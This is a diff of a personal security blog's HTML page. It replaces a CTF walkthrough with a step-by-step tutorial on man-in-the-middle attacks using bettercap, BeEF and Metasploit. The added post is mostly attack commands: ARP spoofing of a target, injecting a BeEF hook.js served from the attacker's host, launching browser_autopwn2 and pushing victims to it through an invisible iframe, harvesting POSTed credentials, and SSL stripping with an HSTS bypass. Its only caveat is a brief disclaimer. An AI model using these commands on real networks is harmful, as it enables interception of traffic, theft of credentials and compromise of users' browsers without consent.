@@ -5,18 +5,17 @@
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
 
-  <title>SpyderSec Challenge</title>
-  <meta property="og:title" content="SpyderSec Challenge" />
-  <meta name="twitter:title" content="SpyderSec Challenge" />
-  <meta name="description" content="1 FLag: I used netdiscover to identify the IP of the machine. 192.168.0.27
-Accessed the IP on the browser
-I then used dirb directory burster to find available directories. dirb http://192.168.0.27 I found one directory, tried to access it but had no permissions. The application suggested that there are several clues on the page. Started by checking the page source. Had an interesting script. Didn&rsquo;t know what to do with it.">
-  <meta property="og:description" content="1 FLag: I used netdiscover to identify the IP of the machine. 192.168.0.27
-Accessed the IP on the browser
-I then used dirb directory burster to find available directories. dirb http://192.168.0.27 I found one directory, tried to access it but had no permissions. The application suggested that there are several clues on the page. Started by checking the page source. Had an interesting script. Didn&rsquo;t know what to do with it.">
-  <meta name="twitter:description" content="1 FLag: I used netdiscover to identify the IP of the machine. 192.168.0.27
-Accessed the IP on the browser
-I then used dirb directory burster to find available directories. dirb http://192.168.0.27 I …">
+  <title>Network Security Man in the Middle(MITM) Attacks</title>
+  <meta property="og:title" content="Network Security Man in the Middle(MITM) Attacks" />
+  <meta name="twitter:title" content="Network Security Man in the Middle(MITM) Attacks" />
+  <meta name="description" content="In this Article Will be trying to explain how to perform a MITM attack with bettercap &#43; beef &#43; metasploit.
+Disclaimer: The content shared below is meant for educational purposes and the writer is not responsible on what you decide to use it for.
+What Is MITM? This is when an attacker convince the target that he is the server and the server that he is the target. What this means is that all packets exchanged between the two, will pass through the attacker.">
+  <meta property="og:description" content="In this Article Will be trying to explain how to perform a MITM attack with bettercap &#43; beef &#43; metasploit.
+Disclaimer: The content shared below is meant for educational purposes and the writer is not responsible on what you decide to use it for.
+What Is MITM? This is when an attacker convince the target that he is the server and the server that he is the target. What this means is that all packets exchanged between the two, will pass through the attacker.">
+  <meta name="twitter:description" content="In this Article Will be trying to explain how to perform a MITM attack with bettercap &#43; beef &#43; metasploit.
+Disclaimer: The content shared below is meant for educational purposes and the writer is not …">
   <meta name="author" content="Stephen Kanyi"/>
   <link href='https://andela-skanyi.github.io/blog/img/avatar-icon.png' rel='icon' type='image/x-icon'/>
   <meta property="og:image" content="https://andela-skanyi.github.io/blog/img/me.jpg" />
@@ -24,12 +23,12 @@ I then used dirb directory burster to find available directories. dirb http://19
   <meta name="twitter:card" content="summary" />
   <meta name="twitter:site" content="@StephenKanyiW" />
   <meta name="twitter:creator" content="@StephenKanyiW" />
-  <meta property="og:url" content="https://andela-skanyi.github.io/blog/cyber-security/spydersec-challenge/" />
+  <meta property="og:url" content="https://andela-skanyi.github.io/blog/cyber-security/network-security-man-in-the-middle-attacks/" />
   <meta property="og:type" content="website" />
   <meta property="og:site_name" content="Kanyi Blog" />
 
   <meta name="generator" content="Hugo 0.26" />
-  <link rel="canonical" href="https://andela-skanyi.github.io/blog/cyber-security/spydersec-challenge/" />
+  <link rel="canonical" href="https://andela-skanyi.github.io/blog/cyber-security/network-security-man-in-the-middle-attacks/" />
   <link rel="alternate" href="https://andela-skanyi.github.io/blog/index.xml" type="application/rss+xml" title="Kanyi Blog">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.7.1/katex.min.css" integrity="sha384-wITovz90syo1dJWVh32uuETPVEtGigN07tkttEqPv+uR2SE/mbQcG7ATL28aI9H0" crossorigin="anonymous">
   <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" />
@@ -173,7 +172,7 @@ I then used dirb directory burster to find available directories. dirb http://19
         <div class="row">
           <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
             <div class="cyber-security-heading">
-              <h1>SpyderSec Challenge</h1>
+              <h1>Network Security Man in the Middle(MITM) Attacks</h1>
                 
                 
             </div>
@@ -191,94 +190,192 @@ I then used dirb directory burster to find available directories. dirb http://19
       <article role="main" class="blog-post">
         
 
-<p><img src="/blog/images/spydersec/thechallenge.png" alt="" /></p>
+<p>In this Article Will be trying to explain how to perform a MITM attack with bettercap + beef + metasploit.</p>
 
-<h3 id="1-flag">1 FLag:</h3>
+<h4 id="disclaimer">Disclaimer:</h4>
 
-<p>I used <code>netdiscover</code> to identify the IP of the machine.
-<code>192.168.0.27</code></p>
+<p>The content shared below is meant for educational purposes and the writer is not responsible on what you decide to use it for.</p>
 
-<p>Accessed the IP on the browser</p>
+<h3 id="what-is-mitm">What Is MITM?</h3>
 
-<p>I then used <code>dirb</code> directory burster to find available directories.
-<code>dirb http://192.168.0.27</code>
-<img src="/blog/images/spydersec/dirb.png" alt="" /></p>
+<p>This is when an attacker convince the target that he is the server and the server that he is the target. What this means is that all packets exchanged between the two, will pass through the attacker.
+<img src="/blog/images/mitm/mitm.png" alt="" /></p>
 
-<p>I found one directory, tried to access it but had no permissions.
-<img src="/blog/images/spydersec/denied.png" alt="" /></p>
+<h3 id="beef-bettercap-metasploit">BEEF + Bettercap + Metasploit.</h3>
 
-<p>The application suggested that there are several clues on the page. Started by checking the page source. Had an interesting script. Didn&rsquo;t know what to do with it.
-<img src="/blog/images/spydersec/clues.png" alt="" /></p>
+<p>So lets get prepping:</p>
 
-<p>Inspecting the page, under cookies there was another url, tried to access it, but still had no permissions.
-<img src="/blog/images/spydersec/permissions.png" alt="" /></p>
+<p>First we enable metasploit extension in beef folder.
+Open <code>extensions/metasploit/config.yaml</code> and set;</p>
 
-<p>Took a step back to think of what i have so far, a script and a url that i cannot access. Decided to concentrate on the script as it might have a clue on how to access the url.</p>
+<p><code>enable: true</code></p>
 
-<p>After a lot of googling on online tools that i can run my js script, i finally got <a href="http://matthewfl.com/unPacker.html">http://matthewfl.com/unPacker.html</a>. I used it to run the script. I got hexadecimal string. I removed the <code>:</code>.
-<img src="/blog/images/spydersec/unpack.png" alt="" /></p>
+<p><code>host: ATTACKER-IP</code></p>
 
-<p>I tried to search for tools online to convert hexadecimal to text. I found <a href="http://www.convertstring.com/EncodeDecode/HexDecode">http://www.convertstring.com/EncodeDecode/HexDecode</a> which i used to convert to text. I later created my own python tool to convert this (I don&rsquo;t want to search for it online everytime). You can find the code here, <a href="https://github.com/andela-skanyi/Converter">Converter</a></p>
+<p><code>callback_host: ATTACKER-IP</code></p>
 
-<p>Here I will use the tool for all the conversion.
-I copied the hex string to a file.
-<img src="/blog/images/spydersec/mulder.png" alt="" /></p>
+<p>It goes without saying that the ATTACKER-IP is the IP of your Kali.</p>
 
-<p>That looks like a file. Tried to access it with</p>
+<p>Create a file in a directory of your choice that will have some parameters that were in extensions/metasploit/config.yaml.
+Lets create beef_to_msf and echo the following into it.</p>
 
-<p><code>http://192.168.0.2/mulder.fbi</code></p>
+<p><code>echo load msgrpc ServerHost:ATTACKER-IP User=msf Pass=abc123 SSL=y &gt; beef_to_msf</code></p>
 
-<p><code>http://192.168.0.2/v/mulder.fbi</code></p>
+<h3 id="start-metasploit">Start metasploit</h3>
 
-<p>And got request not found. Then i tried the previous url. I got a pop up to save a file. Looks like i have found my first flag.
- <img src="/blog/images/spydersec/download.png" alt="" /></p>
+<p><code>msfconsole -r beef_to_msf</code></p>
 
-<p>Saved the file.</p>
+<p>Open Beef from another terminal. You can also open it from the apps.
+<code>./beef -x</code></p>
 
-<h3 id="2-flag">2 FLag:</h3>
+<h3 id="start-bettercap">Start bettercap:</h3>
 
-<p>The file downloaded above was a video. Watched it with hope of finding a clue there. But there was none.
-According to the challenge, the next flag is a text file. <del>first flag (a downloadable file) which is required to find the second flag (a text file)</del>.</p>
+<p>There are several things we can do here;</p>
 
-<p>Somehow the video has the clue to the second flag.</p>
+<ol>
+<li><p>Use bettercap to spoof the target.</p>
 
-<p>I have heard that one can hide a message in another file as a secret method of communication. From what i understand, one can mount a file into another file with a key that will be used to decrypt the file. Which means only people who can rea/find the mounted file are those who have the keys.</p>
+<p><code>bettercap -T &lt;targetIp&gt; --proxy -P POST</code>
+<img src="/blog/images/mitm/login.png" alt="" /> <img src="/blog/images/mitm/pass.png" alt="" /></p></li>
 
-<p>I googled on wome of the tools that can be used to encrypt/decrypt data in a file. I found <code>Veracrypt</code> which was interesting.
-I followed <a href="http://www.linuxandubuntu.com/home/encrypt-data-in-linux-with-veracrypt-an-alternative-to-truecrypt">this</a> guide to install it and learned the basics on how to use it.</p>
+<li><p>Inject beef hook.js with bettercap</p>
 
-<p>Trying to mount the file to a disk but it required a password which I don&rsquo;t have at the moment.
-<img src="/blog/images/spydersec/mount.png" alt="" /></p>
+<p><code>bettercap -T &lt;targetIp&gt; --proxy-module injectjs --js-url &quot;http://&lt;myip&gt;:3000/hook.js&quot;</code></p>
 
-<p>Was back to page source to see if I missed the password there. There were two images there. I used exiftool that scan an image and extract all the info about the image. SpyderSecLogo.png had nothing unusual about the image content, but the Challenge.png had a hexadecimal on the comment field.
-<img src="/blog/images/spydersec/comment.png" alt="" /></p>
+<p>You can view the source page and search for the hook.js script. If it is there, give beef few seconds and it will hook the browser.
+<img src="/blog/images/mitm/source.png" alt="" /></p>
 
-<p>Copied the the hex to a file, and removed the <code>:</code>. Used my tool again to do the conversion. I got another hex, rerun the app and got a base64 encoded string.
-I expanded my tool to decode and encode base64. I used it to decode and got a text string that looked like a password.
-<img src="/blog/images/spydersec/decode.png" alt="" /></p>
+<p><img src="/blog/images/mitm/hook.png" alt="" /></p></li>
 
-<p>Back to veracrypt and used the text as the password.
-<img src="/blog/images/spydersec/veracrypt.png" alt="" /></p>
+<li><p>Combine the two above dumping all the logs into a file.</p>
 
-<p>It mounted 38kb to the disk. Double clicked on the disk to open. It had a Flag.txt file. Opened the file and got a congratulations message. I had found the second flag.
-<img src="/blog/images/spydersec/flag.png" alt="" /></p>
+<p><code>bettercap -T &lt;targetIp&gt; --proxy-module injectjs --js-url &quot;http://&lt;myip&gt;:3000/hook.js&quot; -P POST --log LOG_FILE</code></p>
 
-<h3 id="conclusion">Conclusion:</h3>
+<p>Taking a look at the file created by the above command and searching through for username and password. It will still hook the browser
+<img src="/blog/images/mitm/logs.png" alt="" /></p></li>
+</ol>
 
-<p>The CTF was awesome and challenging enough. I got to learn some of the tools that i added to my arsenal. I will be exploring more on how to hide messages in another file.</p>
+<p>After the succesful hooking.</p>
+
+<p>We can now start using BeEF framework  and start social engineering our target. I will not be showing how to use beef in this post.</p>
+
+<h3 id="optional-metasploit">Optional - Metasploit:</h3>
+
+<p>load the newest version of browser_autopwn called just browser_autopwn2
+ <code>use auxiliary/server/browser_autopwn2</code></p>
+
+<p>Set the required fileds.</p>
+
+<p>SRVHOST = attackerip</p>
+
+<p>URIPATH = /kid    #kid can anything you want</p>
+
+<p>EXCLUDE_PATTERN = android #for example if an attack is aimed at pc, you can exclude android.</p>
+
+<p>ShowExploitList = true</p>
+
+<p>VERBOSE = true</p>
+
+<h3 id="example">Example</h3>
+
+<p><code>set SRVHOST 192.168.12.145</code></p>
+
+<p>Launch the attack</p>
+
+<p><code>run</code></p>
+
+<p><img src="/blog/images/mitm/msf.png" alt="" /></p>
+
+<p>This will give another url that our victim should open but luckily for us, we don&rsquo;t to send it again to the user. We ca use beef to force the client to open it.</p>
+
+<p><code>Commands &gt; Misc &gt; Create invisible Iframe</code></p>
+
+<h3 id="how-does-the-exploit-work">How does the exploit work.</h3>
+
+<p>When the user open the url created, it tries all the loaded exploits  - when one executes succesfully, it creates a session in the background.</p>
+
+<p>Forward the traffic between the server and target.</p>
+
+<p><code>echo 1 &gt; /proc/sys/net/ipv4/ip_forward</code></p>
+
+<p>This will ensure that the traffic reach its intended destination.</p>
+
+<h4 id="nb">NB</h4>
+
+<p>If my machine loose internet, restart the interface
+<code>ifconfig eth0 down &amp;&amp; ifconfig eth0 up</code></p>
+
+<h3 id="other-command-you-can-try-with-bettercap">Other Command you can try with bettercap.</h3>
+
+<p>Now next we try to do arp spoofing.
+ <code>bettercap -T &lt;targetIp&gt; --proxy -P POST</code>
+  the above command is supposed to even handle sslstripping for us helping us bypass the certificate warning.</p>
+
+<p>Sniff without making so much noise.
+  <code>bettercap -X --no-spoofing</code></p>
+
+<p>Sniff and spoof at the same time
+  <code>bettercap -X</code></p>
+
+<p>Sniff with a specific protocal.
+  <code>bettercap -XP HTTPS</code></p>
+
+<p>Log the result into a file
+  <code>bettercap --log LOG_FILE</code></p>
+
+<h3 id="spoofing">Spoofing:</h3>
+
+<p><code>bettercap -S ARP</code>
+if you don&rsquo;t specify the -S option, it uses ARP by default.</p>
+
+<h3 id="sniffing-credentials-harvesting">Sniffing &amp; Credentials Harvesting:</h3>
+
+<p>Spoof and save every captured packet into a file.
+<code>bettercap --sniffer-output ~/capture.pcap</code></p>
+
+<p>Use pcap file as source of packets
+<code>bettercap --sniffer-source ~/capture.pcap</code></p>
+
+<p>Spoof the whole network and sniff only http traffic
+<code>bettercap --sniffer-filter &quot;tcp port http&quot;</code></p>
+
+<p>Spoof whole network and extract data containing &lsquo;password&rsquo; word.
+<code>bettercap --custom-parser &quot;.*password.*&quot;</code></p>
+
+<h3 id="ssl-stripping">SSL Stripping:</h3>
+
+<p>This technique will replace every https link in webpages the target is browsing with http ones so, if a page would normally look like:</p>
+
+<p>~~~<a href="https://www.facebook.com/">https://www.facebook.com/</a> ~~~</p>
+
+<p>It will look like:</p>
+
+<p>~~~ <a href="http://www.facebook.com/">http://www.facebook.com/</a> ~~~</p>
+
+<p>HTTP Strict Transport Security (HSTS) - help to protect websites against protocol downgrade attacks and cookie hijacking.</p>
+
+<p>We have sslstrip2 that bypass HSTS:
+Let&rsquo;s take the previous example page:</p>
+
+<p>~~~ <a href="https://www.facebook.com/~~~">https://www.facebook.com/~~~</a></p>
+
+<p>A HSTS bypass attack will change it to something like:</p>
+
+<p>~~~ <a href="http://wwww.facebook.com/">http://wwww.facebook.com/</a> ~~~</p>
+
+<p>Notice that https has been downgraded to http and www replaced with wwww. Therefore no HSTS rule will be applied since no such rule for that subdomain was created.</p>
+
+<p>The following command perform SSL Stripping and HSTS Bypass attacks in order to capture the traffic/credentials of a specific target.
+<code>bettercap -T &lt;targetIP&gt; --proxy -P POST</code></p>
 
       </article>
 
       <ul class="pager blog-pager">
         
           <li class="previous">
-            <a href="https://andela-skanyi.github.io/blog/cyber-security/mr-robot-ctf-walkthrough/" data-toggle="tooltip" data-placement="top" title="Mr Robot CTF Walkthrough">&larr; Previous Post</a>
+            <a href="https://andela-skanyi.github.io/blog/cyber-security/spydersec-challenge/" data-toggle="tooltip" data-placement="top" title="SpyderSec Challenge">&larr; Previous Post</a>
           </li>
         
-        
-          <li class="next">
-            <a href="https://andela-skanyi.github.io/blog/cyber-security/network-security-man-in-the-middle-attacks/" data-toggle="tooltip" data-placement="top" title="Network Security Man in the Middle(MITM) Attacks">Next Post &rarr;</a>
-          </li>
         
       </ul>
 
